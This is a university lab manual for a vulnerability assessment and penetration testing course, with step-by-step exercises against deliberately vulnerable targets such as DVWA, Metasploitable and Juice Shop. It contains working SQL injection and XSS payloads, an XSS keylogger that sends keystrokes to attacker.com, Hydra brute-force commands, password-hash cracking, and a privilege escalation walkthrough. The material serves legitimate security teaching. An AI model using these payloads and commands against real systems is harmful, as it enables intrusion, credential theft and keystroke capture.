# Vulnerability Assessment & Penetration Testing (VAPT)
# Complete Step-by-Step Lab Guide — BICL606

> **Environment Required:** Kali Linux (attacker machine), Metasploitable 2 / DVWA / Sunset VM (target machines), VirtualBox or VMware with Host-Only or NAT Network.

---

## Table of Contents

1. [Experiment 1 – Network Reconnaissance & Footprinting](#experiment-1)
2. [Experiment 2 – Vulnerability Scanning & Assessment](#experiment-2)
3. [Experiment 3 – Exploiting a Known Vulnerability](#experiment-3)
4. [Experiment 4 – SQL Injection Attacks on Web Applications](#experiment-4)
5. [Experiment 5 – Cross-Site Scripting (XSS)](#experiment-5)
6. [Experiment 6 – Password Cracking & Credential Harvesting](#experiment-6)
7. [Experiment 8 – Privilege Escalation on a Compromised Host](#experiment-8)
8. [Experiment 9 – Full Web Application Penetration Test](#experiment-9)

---

<a name="experiment-1"></a>
## Experiment 1: Network Reconnaissance & Footprinting

**Objective:** Map all live hosts, open ports, running services, and OS information within a given subnet. Perform passive external reconnaissance on a target domain.

**Tools Required:** Nmap, Amass, Kali Linux terminal

---

### Phase A — Internal Network Scanning with Nmap

#### Step 1: Find Your Own IP Address

Open a terminal on Kali Linux and run:

```bash
ip a
```

Or on Windows:
```cmd
ipconfig
```

Note down your **IPv4 address** and **subnet mask** (e.g., `192.168.1.5 / 255.255.255.0`).  
Convert subnet mask to CIDR: `255.255.255.0` → `/24`.  
Your target range will be something like `192.168.1.0/24`.

#### Step 2: Host Discovery (Ping Sweep)

Discover all live hosts on the subnet without triggering port scans:

```bash
nmap -sn 192.168.1.0/24
```

- `-sn` = Ping scan only (no port scan)
- This lists all IPs that responded with their MAC addresses

**Expected Output:** A list of hosts that are online, e.g., `192.168.1.1`, `192.168.1.103`, etc.

#### Step 3: Choose a Target and Run a Detailed Scan

Pick a live host IP (e.g., `192.168.1.103`) and run a comprehensive scan:

```bash
nmap -sS -sV -O 192.168.1.103
```

Flags explained:
- `-sS` = SYN (stealth) scan — doesn't complete the TCP handshake
- `-sV` = Service/version detection
- `-O` = OS fingerprinting

**Expected Output:** Open ports, services with versions (e.g., `Apache 2.4.7`), and a guessed OS.

#### Step 4: Aggressive Full Scan of the Entire Subnet

```bash
nmap -A 192.168.1.0/24
```

- `-A` = Enables OS detection, version detection, script scanning, and traceroute
- This may take a few minutes for the full subnet

**Record:** Note IP addresses, open ports, service names/versions, and OS guesses in a table.

#### Step 5: Scan All 65535 Ports on a Specific Target

```bash
nmap -p- -A 192.168.1.103
```

- `-p-` = Scan all ports (1–65535)
- Useful for finding services running on non-standard ports

#### Step 6: Save Scan Results to a File

```bash
nmap -A 192.168.1.0/24 -oN network_scan_results.txt
```

- `-oN` = Save in normal (human-readable) format

---

### Phase B — External Passive Reconnaissance with Amass

#### Step 7: Install Amass (if not already installed)

```bash
sudo apt update && sudo apt install amass -y
```

#### Step 8: Run Subdomain Enumeration

```bash
amass enum -d microsoft.com
```

Replace `microsoft.com` with any domain assigned by your instructor.

- This passively queries DNS records, certificate transparency logs, APIs, and web archives
- No direct traffic is sent to the target

#### Step 9: View and Save Results

```bash
amass enum -d microsoft.com -o amass_results.txt
cat amass_results.txt
```

**Expected Output:** A list of subdomains, associated IP addresses, ASN numbers, and hosting providers.

---

### Deliverable

Create a **Network Inventory Report** with:
- Table of discovered hosts (IP, hostname, OS, open ports, running services)
- Amass subdomain findings (subdomain, IP, ASN, provider)

---

<a name="experiment-2"></a>
## Experiment 2: Vulnerability Scanning & Assessment

**Objective:** Use Nikto to scan a web application (DVWA) for known vulnerabilities, misconfigurations, and dangerous paths.

**Tools Required:** Kali Linux, Nikto, DVWA running on localhost

---

### Phase A — Setting Up DVWA

#### Step 1: Start Apache Service

```bash
sudo service apache2 start
```

Verify it's running:
```bash
sudo systemctl status apache2
```

#### Step 2: Open DVWA in Browser

Open Firefox on Kali and navigate to:
```
http://127.0.0.1/DVWA
```

If the page loads, DVWA is active. If not, ensure Apache is running and DVWA is installed in `/var/www/html/DVWA/`.

---

### Phase B — Running Nikto Web Scanner

#### Step 3: Run Basic Nikto Scan Against DVWA

```bash
nikto -h http://127.0.0.1/DVWA/
```

- `-h` = Target host/URL
- Nikto will scan for outdated software, dangerous files, misconfigurations, and default credentials

**What Nikto checks:**
- Server headers and version disclosure
- Default/backup files (e.g., `/robots.txt`, `/README`, `/.git/`)
- Dangerous HTTP methods (PUT, DELETE)
- Insecure cookies and headers
- Known CVEs for the detected software

#### Step 4: Save Nikto Output

```bash
nikto -h http://127.0.0.1/DVWA/ -o nikto_report.txt
```

#### Step 5: Explore Discovered Paths in Browser

Nikto will list paths like `/DVWA/config`, `/DVWA/tests/`, `/DVWA/docs/`, etc. Test each one in the browser:

```
http://127.0.0.1/DVWA/config/
http://127.0.0.1/DVWA/tests/
http://127.0.0.1/DVWA/docs/
```

Note which paths are accessible and what information they expose (e.g., configuration files, test scripts).

#### Step 6: Analyze Output

For each finding, note:
- **Vulnerability type** (e.g., Information Disclosure, XSS, SQLi)
- **CVE number** if listed (e.g., `CVE-2020-XXXX`)
- **Severity** (Low / Medium / High / Critical)
- **Recommended fix**

---

### Deliverable

A **Vulnerability Assessment Report** containing:
- Nikto scan summary
- Table of vulnerabilities with CVE references and risk ratings
- Recommendations for remediation

---

<a name="experiment-3"></a>
## Experiment 3: Exploiting a Known Vulnerability

**Objective:** Exploit a vulnerable target (Sunset VM) using FTP anonymous login, extract a password hash file, crack it with John the Ripper, and gain SSH access.

**Tools Required:** Kali Linux, Sunset VM, Nmap, FTP client, John the Ripper

---

### Phase A — Setting Up the Environment

#### Step 1: Start Both Virtual Machines

- Start your **Kali Linux** VM (attacker)
- Start the **Sunset** VM (target)
- Ensure both are on the same network (Host-Only or NAT)

---

### Phase B — Network Discovery

#### Step 2: Discover Target IP

```bash
netdiscover
```

Or use Nmap:
```bash
nmap -sn 192.168.1.0/24
```

Look for a host labeled with **PCS System** as the hostname. Note its IP (e.g., `192.168.1.104`).

---

### Phase C — Port Scanning

#### Step 3: Full Port and Service Scan

```bash
nmap -A -p- 192.168.1.104
```

**Expected Output:**

| Service | Port | Status | Version |
|---------|------|--------|---------|
| FTP | 21 | Open | vsftpd 2.3.4 |
| SSH | 22 | Open | OpenSSH 4.7p1 Debian |
| HTTP | 80 | Open | Apache 2.x |

---

### Phase D — FTP Exploitation (Anonymous Login)

#### Step 4: Connect to FTP Server

```bash
ftp 192.168.1.104
```

When prompted:
```
Username: anonymous
Password: [press Enter]
```

Anonymous login allows access without valid credentials.

#### Step 5: List and Download Files

```bash
ls
get backup
exit
```

The file `backup` contains password hashes for the system users.

---

### Phase E — Password Cracking with John the Ripper

#### Step 6: Save the Hash to a File

Copy the contents of the downloaded `backup` file and save it:

```bash
cp backup sunset.txt
cat sunset.txt
```

The file contains entries in the format:
```
username:$hash_type$hashedpassword
```

#### Step 7: Crack with John the Ripper

```bash
john sunset.txt
```

John will automatically detect the hash type and attempt to crack using its default wordlists.

To use a specific wordlist (rockyou):
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sunset.txt
```

#### Step 8: View Cracked Passwords

```bash
john --show sunset.txt
```

**Expected Output:** Username and cracked password, e.g., `sunset:cheer14`

---

### Phase F — SSH Login

#### Step 9: Login to Target Machine

```bash
ssh sunset@192.168.1.104
```

Enter the cracked password when prompted. You should now have shell access.

---

### Deliverable

- Screenshot of FTP anonymous login
- Screenshot of John the Ripper output (cracked password)
- Screenshot of successful SSH login
- Brief write-up of potential impact

---

<a name="experiment-4"></a>
## Experiment 4: SQL Injection Attacks on Web Applications

**Objective:** Set up DVWA with a MariaDB/MySQL backend and perform SQL injection attacks including data extraction and schema enumeration.

**Tools Required:** Kali Linux, DVWA, MariaDB/MySQL, Firefox browser

---

### Phase A — Setting Up DVWA with MySQL

#### Step 1: Install DVWA

```bash
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chmod -R 755 /var/www/html/DVWA
```

#### Step 2: Start Apache Web Server

```bash
sudo service apache2 start
```

#### Step 3: Start MySQL/MariaDB

```bash
sudo service mariadb start
```

If you get an error:
```bash
sudo systemctl start mysql
```

Check status:
```bash
sudo systemctl status mysql
```

Press `q` to exit the status view.

#### Step 4: Configure MySQL — Create DVWA Database and User

Enter MySQL shell:
```bash
sudo mysql -u root
```

Run the following SQL commands one by one:

```sql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

#### Step 5: Configure DVWA's Config File

```bash
sudo cp /var/www/html/DVWA/config/config.inc.php.dist /var/www/html/DVWA/config/config.inc.php
sudo nano /var/www/html/DVWA/config/config.inc.php
```

Update the following lines:
```php
$_DVWA[ 'db_user' ] = 'dvwa';
$_DVWA[ 'db_password' ] = 'password';
$_DVWA[ 'db_database' ] = 'dvwa';
```

Save with `CTRL+X`, then `Y`, then `Enter`.

#### Step 6: Restart Services

```bash
sudo systemctl restart apache2
sudo systemctl restart mysql
```

#### Step 7: Initialize the DVWA Database via Browser

Open Firefox and navigate to:
```
http://localhost/DVWA/setup.php
```

Scroll to the bottom and click **"Create / Reset Database"**.

It will ask for authentication:
- Username: `admin`
- Password: `password`

DVWA should now be fully set up.

---

### Phase B — Performing SQL Injection

#### Step 8: Log into DVWA

Navigate to:
```
http://localhost/DVWA/login.php
```

Login with `admin` / `password`.

#### Step 9: Set Security Level to Low

Click **DVWA Security** in the left panel → Set level to **Low** → Click Submit.

#### Step 10: Go to SQL Injection Page

Click **SQL Injection** in the left panel.

#### Step 11: Basic Test — Extract All Users

In the **User ID** text box, enter:
```
%' or '0'='0
```

Click Submit. This returns all records because `'0'='0'` is always true.

**SQL equivalent:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '%' OR '0'='0';
```

#### Step 12: Extract Database Version

```
%' or 0=0 union select null, version() #
```

The **database version** (e.g., `5.1.60` or `10.x.x`) will appear in the Last Name field of the last result.

#### Step 13: List All Tables in the Database

```
%' and 1=0 union select null, table_name from information_schema.tables #
```

This dumps the names of **all tables** in the MySQL `information_schema`.

#### Step 14: Extract Usernames and Passwords from DVWA

```
%' and 1=0 union select user, password from users #
```

This will display usernames and their MD5 password hashes.

#### Step 15: Automate with SQLMap

For automated injection and full database dumping, use SQLMap:

First, get the session cookie from DVWA (from Firefox Developer Tools → Storage → Cookies).

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session_id>;security=low" \
  --dbs
```

To dump the `dvwa` database:
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session_id>;security=low" \
  -D dvwa --tables
```

---

### Deliverable

- Screenshots/logs of each SQL injection payload and its output
- Extracted database version, table names, and user credentials
- Brief risk assessment report

---

<a name="experiment-5"></a>
## Experiment 5: Cross-Site Scripting (XSS)

**Objective:** Identify and exploit Reflected and Stored XSS vulnerabilities in DVWA to understand how attackers inject and execute malicious scripts in web applications.

**Tools Required:** Kali Linux, DVWA, Firefox browser

---

> **Note:** Ensure DVWA is running (from Experiment 4 setup) and security level is set to **Low**.

---

### Phase A — Reflected XSS

Reflected XSS occurs when user input is immediately returned by the server and executed in the victim's browser.

#### Step 1: Navigate to Reflected XSS Page

```
http://localhost/DVWA/vulnerabilities/xss_r/
```

#### Step 2: Test Basic Script Injection

In the **Name** field, enter:
```html
<script>alert('XSS')</script>
```

Click Submit. A pop-up alert box should appear saying "XSS". This confirms the input is not sanitized.

#### Step 3: Steal Cookie via Reflected XSS

Inject a script that displays the session cookie:
```html
<script>alert(document.cookie)</script>
```

A pop-up will show the session cookie. In a real attack, this would be sent to an attacker-controlled server.

#### Step 4: Try Image Tag XSS

```html
<img src=x onerror="alert('XSS via img tag')">
```

This executes when the browser fails to load the invalid image.

---

### Phase B — Stored XSS

Stored XSS is more dangerous — the malicious script is saved in the database and executes for every user who visits the page.

#### Step 5: Navigate to Stored XSS Page

```
http://localhost/DVWA/vulnerabilities/xss_s/
```

#### Step 6: Inject a Persistent Script

In the **Message** text box, enter:
```html
<script>alert('Stored XSS!')</script>
```

Click **Sign Guestbook**. Every time any user visits this guestbook page, the alert will fire.

#### Step 7: Inject a Keylogger Script (Demonstration Only)

To demonstrate data theft:
```html
<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key}</script>
```

> **Note:** This is for educational purposes only. In a real attack, this would silently capture keystrokes and send them to an attacker's server.

#### Step 8: Observe and Document

- Log into DVWA with another browser tab (as another user) and visit the guestbook page
- Observe that the stored script fires for any user
- Document what data could be stolen (cookies, keystrokes, form data)

---

### Deliverable

- Screenshots of Reflected and Stored XSS in action
- Explanation of the attack flow and potential real-world impact
- Remediation recommendation (input validation, output encoding, Content Security Policy)

---

<a name="experiment-6"></a>
## Experiment 6: Password Cracking & Credential Harvesting

**Objective:** Extract MD5 password hashes from DVWA's SQL injection vulnerability, then crack them using John the Ripper.

**Tools Required:** Kali Linux, DVWA (from Experiment 4), John the Ripper, Notepad/Text Editor

---

### Phase A — Extract Password Hashes from DVWA

#### Step 1: Log into DVWA and Go to SQL Injection

Navigate to:
```
http://localhost/DVWA/vulnerabilities/sqli/
```

Ensure security level is set to **Low**.

#### Step 2: Dump Usernames and Hashes

Enter this payload in the User ID field:
```
%' and 1=0 union select user, password from users #
```

**Expected Output:** A list of usernames and their corresponding MD5 hashes:

| First Name | Surname |
|------------|---------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

#### Step 3: Create a Hash File

Open a text editor:
```bash
nano /usr/share/john/dvwa_passwords.txt
```

Format each line as `username:hash`:
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

Save with `CTRL+X`, `Y`, `Enter`.

---

### Phase B — Cracking with John the Ripper

#### Step 4: Navigate to John's Directory

```bash
cd /usr/share/john/
```

#### Step 5: Crack with Raw-MD5 Format

```bash
john --format=raw-MD5 dvwa_passwords.txt
```

John will use its built-in wordlists and rules to crack the hashes.

#### Step 6: Use RockYou Wordlist for Better Results

```bash
john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt dvwa_passwords.txt
```

> If rockyou.txt is compressed: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

#### Step 7: Show All Cracked Passwords

```bash
john --show --format=raw-MD5 dvwa_passwords.txt
```

**Expected Output:**
```
admin:password
gordonb:abc123
pablo:letmein
smithy:password
```

#### Step 8: Add Timestamp and Your Name (Lab Proof)

```bash
john --show --format=raw-MD5 dvwa_passwords.txt
date
echo "Your Full Name"
```

---

### Phase C — Bonus: Brute-Force SSH/FTP with Hydra

#### Step 9: Brute-Force SSH Login (against Metasploitable 2)

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.104
```

- `-l` = Single username to try
- `-P` = Password file
- Replace IP with your Metasploitable 2 address

#### Step 10: Brute-Force FTP Login

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.104
```

---

### Deliverable

- John the Ripper output showing cracked passwords
- Table of usernames, hashes, and plaintext passwords
- Password complexity recommendations (minimum length, character mix, no dictionary words)

---

<a name="experiment-8"></a>
## Experiment 8: Privilege Escalation on a Compromised Host

**Objective:** Starting from a low-privilege shell on the Sunset/mhz_cif VM, escalate to root access by discovering credentials via steganography and exploiting `sudo` misconfigurations.

**Tools Required:** Kali Linux, Sunset (mhz_cif) VM, Nmap, dirb, ssh, steghide, scp

---

### Phase A — Network Scanning

#### Step 1: Discover the Target

Start both Kali and the target VM. Find the target IP:

```bash
nmap -sn 192.168.1.0/24
```

Note the target IP (e.g., `192.168.1.104`).

#### Step 2: Full Port Scan

```bash
nmap -p- -A 192.168.1.104
```

**Key findings:**
- Port 22 (SSH) — open
- Port 80 (HTTP) — open

---

### Phase B — Web Enumeration

#### Step 3: Directory Brute-Force for Hidden Files

```bash
dirb http://192.168.1.104/ -X .txt
```

- `-X .txt` = Only look for `.txt` files
- This discovers hidden text files that may contain hints

**Expected findings:**
```
http://192.168.1.104/notes.txt
http://192.168.1.104/remb.txt
```

#### Step 4: Read the Discovered Files

```bash
curl http://192.168.1.104/notes.txt
curl http://192.168.1.104/remb.txt
```

These files likely contain usernames, notes, or hints about the machine.

---

### Phase C — Initial Foothold via SSH

#### Step 5: SSH Login with Discovered Credentials

Based on hints found in the text files, attempt SSH login:

```bash
ssh first_stage@192.168.1.104
```

Enter the password hinted at in `notes.txt` or `remb.txt`.

#### Step 6: Explore the System

Once logged in:
```bash
ls
cat user.txt          # First flag
cd /home
ls                    # List all user home directories
cd mhz_cif
ls
cd Paintings
ls                    # Look for image files
```

---

### Phase D — Data Exfiltration

#### Step 7: Copy Image Files to Your Kali Machine

Open a **new terminal on Kali** (do not close the SSH session):

```bash
mkdir ~/raj
cd ~/raj
scp first_stage@192.168.1.104:/home/mhz_cif/Paintings/* .
ls
```

You should now have image files (e.g., JPEG files) downloaded to your local `raj` directory.

---

### Phase E — Steganography

#### Step 8: Extract Hidden Data from Images

Use `steghide` to extract hidden files embedded in the images:

```bash
steghide extract -sf "spinning the wool.jpeg"
```

When prompted for a passphrase, press **Enter** (try empty passphrase first).

```bash
cat remb2.txt
```

**Expected Output:** Password or credentials for the `mhz_cif` user.

---

### Phase F — Privilege Escalation

#### Step 9: Switch to mhz_cif User (Back in SSH session)

```bash
su mhz_cif
```

Enter the password obtained from the steganography step.

#### Step 10: Check Current Privileges

```bash
id
```

Shows your current user ID, group ID, and group memberships.

#### Step 11: Escalate to Root via sudo

```bash
sudo su
```

If `mhz_cif` has unrestricted sudo access (a misconfiguration), this will grant a root shell.

#### Step 12: Explore as Root

```bash
cd /root
ls
ls -la              # Show hidden files
cat .root.txt       # Final root flag
```

---

### Understanding the Vulnerability

The privilege escalation worked because:
1. The user `mhz_cif` was granted `sudo su` without a password restriction in `/etc/sudoers`
2. Credentials were hidden insecurely (steganography in an accessible directory)
3. The initial SSH credentials were stored in a world-readable web-accessible text file

---

### Deliverable

- Screenshot of `id` command showing `uid=0(root)`
- Screenshot of `cat .root.txt` showing the root flag
- Write-up explaining: initial foothold → lateral movement → privilege escalation path
- Recommendations to fix each vulnerability

---

<a name="experiment-9"></a>
## Experiment 9: Full Web Application Penetration Test

**Objective:** Perform a comprehensive web application penetration test against OWASP Juice Shop using OWASP ZAP (Zed Attack Proxy) to identify XSS, SQLi, broken authentication, and IDOR vulnerabilities.

**Tools Required:** Kali Linux, OWASP ZAP, Firefox, Internet connection (for Juice Shop)

---

### Phase A — Setting Up OWASP ZAP

#### Step 1: Update Package Lists

```bash
sudo apt update
```

#### Step 2: Install OWASP ZAP

```bash
sudo apt install zaproxy -y
```

Alternatively, download the latest version from the official site:
```bash
cd ~/Downloads
# Download Linux installer from https://www.zaproxy.org/download/
chmod o+x ZAP_*.sh
./ZAP_*.sh
```

Follow the installer: Next → Accept License → Install.

#### Step 3: Launch OWASP ZAP

```bash
zaproxy
```

Or find it in Kali Applications → Web Application Analysis → OWASP ZAP.

#### Step 4: Handle the Initial Dialog

When ZAP opens, it asks to persist the session:
- Select **"No, I do not want to persist this session"** for a clean start
- Close any tip-of-the-day dialogs

---

### Phase B — Setting Up the Target

#### Step 5: Set Up OWASP Juice Shop

**Option A — Use the Online Instance:**
Target URL: `http://juice-shop.herokuapp.com`

**Option B — Run Locally with Docker (Recommended):**
```bash
sudo apt install docker.io -y
sudo docker pull bkimminich/juice-shop
sudo docker run -d -p 3000:3000 bkimminich/juice-shop
```
Target URL: `http://localhost:3000`

**Option C — Run Locally with Node.js:**
```bash
sudo apt install nodejs npm -y
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start
```
Target URL: `http://localhost:3000`

---

### Phase C — Automated Scan with OWASP ZAP

#### Step 6: Run Automated Scan

In ZAP:
1. Go to the **Quick Start** tab (shown on startup)
2. Click **Automated Scan**
3. In the **URL to attack** field, enter: `http://localhost:3000`
4. Click **Attack**

ZAP will:
- **Spider** the application (discover all pages and links)
- **AJAX Spider** (for JavaScript-heavy apps)
- **Active Scan** (send attack payloads)

This process takes 10–20 minutes. Monitor progress in the status bar at the bottom.

---

### Phase D — Manual Exploration (Passive + Active)

#### Step 7: Configure Firefox to Use ZAP as Proxy

1. In Firefox: Settings → Network Settings → Manual proxy
2. HTTP Proxy: `127.0.0.1`, Port: `8080`
3. Check **"Also use this proxy for HTTPS"**

Now all browser traffic passes through ZAP for interception and analysis.

#### Step 8: Browse the Application

Visit Juice Shop manually in Firefox:
- Register a new account
- Browse product listings
- Search for products
- Add items to cart

ZAP will passively log all requests and responses.

---

### Phase E — Reviewing Vulnerabilities

#### Step 9: Check the Alerts Tab

In ZAP, click the **Alerts** tab at the bottom.

Alerts are categorized by severity:
- 🔴 **High** — e.g., SQL Injection, Remote Code Execution
- 🟠 **Medium** — e.g., Cross-Site Scripting, Insecure Headers
- 🟡 **Low** — e.g., Cookie without Secure flag
- 🔵 **Informational** — e.g., User agent disclosure

Double-click any alert to see:
- Description of the vulnerability
- Evidence (the request/response that triggered it)
- Risk level and confidence
- **Recommended solution**

---

### Phase F — Manual Exploit: SQL Injection in Juice Shop

#### Step 10: Admin Login Bypass via SQLi

Navigate to Juice Shop login page: `http://localhost:3000/#/login`

In the **Email** field, enter:
```
' OR 1=1--
```

In the **Password** field, enter anything (e.g., `password`).

Click **Log in**.

**Expected Result:** You log in as the admin user without knowing the password.

**Why it works:** The backend SQL query becomes:
```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
```
The `1=1` is always true, and `--` comments out the rest.

---

### Phase G — Manual Exploit: Reflected XSS

#### Step 11: Test XSS in Search Field

Navigate to the search bar on Juice Shop and enter:
```html
<iframe src="javascript:alert('XSS')">
```

Or try:
```html
<script>alert(document.domain)</script>
```

If the application is vulnerable, an alert box will appear.

---

### Phase H — Manual Exploit: Broken Access Control / IDOR

#### Step 12: Access Another User's Basket

In ZAP's **Sites** tree, look for requests like:
```
GET /rest/basket/1
GET /rest/basket/2
```

Modify the basket ID in the request and repeat it with ZAP's **Requester** tab:
- Right-click a basket request → Open/Resend with Request Editor
- Change the ID number and send

If you can access another user's basket, this is an **IDOR (Insecure Direct Object Reference)** vulnerability.

---

### Phase I — Generate a Report

#### Step 13: Generate ZAP HTML Report

In ZAP menu: **Report → Generate HTML Report**

Save it as `juice_shop_pentest_report.html`.

The report includes:
- Summary of all alerts
- Severity breakdown
- Detailed findings with evidence
- Solution recommendations

---

### Phase J — Summary of Common Juice Shop Vulnerabilities

| Vulnerability | Location | Severity | Remediation |
|---------------|----------|----------|-------------|
| SQL Injection | Login page | High | Parameterized queries |
| XSS | Search bar, feedback | Medium | Output encoding, CSP |
| Broken Auth | Login bypass | High | Input validation, CAPTCHA |
| IDOR | `/rest/basket/:id` | High | Authorization checks per user |
| Security Headers | All pages | Medium | Add HSTS, X-Frame-Options |
| Sensitive Data Exposure | FTP `/ftp/` | Medium | Restrict directory access |

---

### Deliverable

A **Full Web Application Penetration Test Report** including:
- Executive summary
- Methodology (tools used, scan type)
- Findings table (vulnerability, severity, evidence, remediation)
- Screenshots of each exploit
- CVSS scores where applicable
- Remediation priority order

---

## General Tips for All Experiments

- Always take screenshots **before and after** each action as proof of work
- Run scans on assigned lab IPs only — never on real internet targets
- Document every command used and its output
- Note any errors and how you resolved them
- All experiments are performed in an **isolated virtual lab environment** for safety

---

*Lab Manual: BICL606 — Vulnerability Assessment & Penetration Testing*  
*Experiments Covered: 1, 2, 3, 4, 5, 6, 8, 9*
